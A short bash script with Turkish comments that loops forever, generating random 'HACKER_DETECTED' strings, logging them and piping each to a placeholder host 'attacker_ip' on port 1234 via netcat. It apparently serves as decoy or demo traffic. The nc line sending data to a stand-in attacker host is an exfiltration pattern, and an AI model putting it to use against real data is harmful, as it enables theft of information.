#!/bin/bash

# Sahte servis başlatılıyor...
echo "Sahte veri gönderme işlemine başlıyor..."

# Döngü ile sahte veri üretilip gönderiliyor
while true; do
  # Sahte bir veri oluştur
  fake_data=$(echo "HACKER_DETECTED:$(date +%s):$(openssl rand -hex 12)")

  # Sahte veriyi bir log dosyasına yaz
  echo "$fake_data" >> fake_log.txt

  # Sahte bir ağ bağlantısına veri gönder
  echo "$fake_data" | nc -q 1 attacker_ip 1234

  # Biraz bekle
  sleep 1
done
